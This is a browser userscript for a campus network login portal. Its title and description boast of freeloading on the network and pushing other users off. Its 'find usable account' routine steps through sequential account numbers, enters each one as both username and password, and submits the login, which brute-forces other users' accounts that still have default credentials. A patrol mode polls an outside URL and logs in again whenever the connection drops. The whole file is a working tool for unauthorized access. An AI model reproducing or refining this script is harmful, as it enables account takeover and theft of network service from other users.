// ==UserScript==
// @name         为了白嫖校园网!
// @namespace    http://172.16.254.6/1.htm
// @version      0.4
// @description  把别人都挤下去！！
// @author       You
// @match        http://172.16.254.6/*
// @match        http://172.16.254.6/a79.htm?isReback=1
// @grant        none
// @require  https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js
// @downloadURL https://update.greasyfork.org/scripts/425581/%E4%B8%BA%E4%BA%86%E7%99%BD%E5%AB%96%E6%A0%A1%E5%9B%AD%E7%BD%91%21.user.js
// @updateURL https://update.greasyfork.org/scripts/425581/%E4%B8%BA%E4%BA%86%E7%99%BD%E5%AB%96%E6%A0%A1%E5%9B%AD%E7%BD%91%21.meta.js
// ==/UserScript==

(function() {
    'use strict';
    var user=602
    var password=602;  //账号密码，可自动修改
    var ii=0;
    var aaa//=setInterval(a,2000);
    $(function(){
        //$('logout').css({"left":"59.5px"});
        a(null);
        var flg=true;
        $('[name="f1"]').append('<div id="my_tools" style="position: relative;left:119.5px;top: 210px; width:80%;">'+
                                '<h6 id="Tools_title" style="position: absolute; left:10px;top:5px;">黄氏小工具</h6>'+
                                '<input type="button" style="padding: 6px; border-radius: 2px;width: 100px; height: 30px;position: absolute; '+
                                'left:10px;top:15px;text-align: center;right: auto;bottom: auto;color: rgb(255, 255, 255);font-size: 16px;box-shadow: 0px 0px 3px rgb(50 47 47);'+
                                'background-color: rgb(185, 66, 48)" value="一键注销" id="my_logout">'+
                                '<input type="button" style="padding: 6px; border-radius: 2px;position: absolute; left:130px;top:50px;width: 150px; height: 30px;'+
                                'text-align: center;right: auto;bottom: auto;color: rgb(255, 255, 255);font-size: 16px;box-shadow: 0px 0px 3px rgb(50 47 47);'+
                                'background-color: rgb(185, 66, 48)" value="自动巡查模式" id="my_login">'+
                                '<input type="text" id="my_text" size="2" style="position: absolute; left:-20px;top:50px;">'+
                                '<span style="position: absolute; left:50px;top:55px;">毫秒执行一次</span></div>');
        $('#my_logout').click(function(){logout();});
        $('#my_login').click(function(){
            var speed=$('#my_text').val();
            if(speed==null||speed==" "||speed==""||isNaN(speed)) alert("没有输入正确的数字");
            else if(!flg){
                flg=true;
                a(getline());
                aaa=setInterval('a(getline())',speed);
                alert('开始巡逻');
            }
            else if(flg){
                flg=false;
                clearInterval(aaa);
                alert('已停止巡逻');
            }
        });
        //-------------------寻找账号-------------------------------------------
        if(getUrlValue('index')!=false) {
            console.log(getUrlValue('index')+"-----start")
            ii=parseInt(getUrlValue('index'));
            my_find();
        }
        $('[class="edit_row ui-resizable-autohide"]').eq(1).append(
            '从<input type="text" id="my_text" size="2" style="position: absolute; left:20px;top:200px;">开始'+
            '<input type="button" style="padding: 6px; border-radius: 2px;width: 150px; height: 30px;position: absolute; '+
            'left:10px;top:250px;text-align: center;right: auto;bottom: auto;color: rgb(255, 255, 255);font-size: 16px;box-shadow: 0px 0px 3px rgb(50 47 47);'+
            'background-color: rgb(185, 66, 48)" value="寻找可用账号" id="my_find">'
        );
        $('#my_find').click(()=>{
          my_find();
        });

        function my_find(){
            if(!($('#my_text').val()==null||isNaN(parseInt($('#my_text').val()))))
                ii=parseInt($('#my_text').val());
            if(!line){
                user=ii;
                password=ii;
                console.log('find user-----------start:'+ii);
                ii++;
                putpass();
                setTimeout(()=>{
                    a(goto());
                },2000);
            }
        }

        function goto(){
            window.location.href="http://172.16.254.6/a79.htm?index="+ii;
        }
        function getUrlValue(variable){
            var query=window.location.search.substring(1);
            query=query.replace('?','&')
            var vars=query.split("&");
            for(var i=0;i<vars.length;i++){
                var pair=vars[i].split("=");
                if(pair[0]==variable){console.log(ii+"---------geturl"); return pair[1];}
            }
            console.log('Don`t find index')
            return(false);
        }
        //---------------------------------------------------------------------------
        //-----------------------------------------------------------------------------
        $('[class="edit_row ui-resizable-autohide"]').eq(1).append('<button id="my_big" '+
              'style="width:150px; height:30px; background:red; color:white;position: absolute;left:0; top:300px;">一键登录</button>');
        $('#my_big').click(function(){
            window.location.reload();
            putpass();
        });

    })
    var flg_log=false;
    function getline(){
        if(flg_line()) console.log(new Date().getHours()+":"+new Date().getMinutes()+"___has line");
        else{
            console.log(new Date().getHours()+":"+new Date().getMinutes()+"___not has line"+window.location.href);
            //logout();
            if(!flg_log) {
                console.log("刷新 start-------flg_log:"+flg_log);
                window.location.reload();
                flg_log==true;
                putpass();
                console.log("刷新 over and putpass() go-------flg_log:"+flg_log);
            }
            console.log('one null getline----flg_log:'+flg_log);
            //window.location.reload();
            //setTimeout(putpass,2000);
            //window.location.reload();刷新
        }
    }

    function logout(){
        $("[name='logout']").click();
        $("[class='boxy-btn1']").click();
        setTimeout(function(){ $("[name='GobackButton']").click();},500);
    }

    function putpass(){
        console.log('putpass start-----');
        $("[name='DDDDD']").val(user);
        $("[name='upass']").val(user);
        $("[name='network']").click();
        $("[name='0MKKey']").click();
        flg_log=false;
        console.log('putpass over------');
        if(aaa!=null) clearInterval(aaa);
    }
    var line=false;
    function a(dosome){
        var imgPath = "https://www.lilnong.top/cors/"+Math.random();
        $.ajax({
            url: imgPath,
            timeout: 500,
            success: function(result){
                line=true;
            },
            error: function(result){
                line=false;
                console.log("err_line_____"+dosome);
                if(dosome!=null) dosome();
            }
        });
    }

    function flg_line(){
        console.log("get flg_line:"+line);
        return line;
    }
    // Your code here...
})();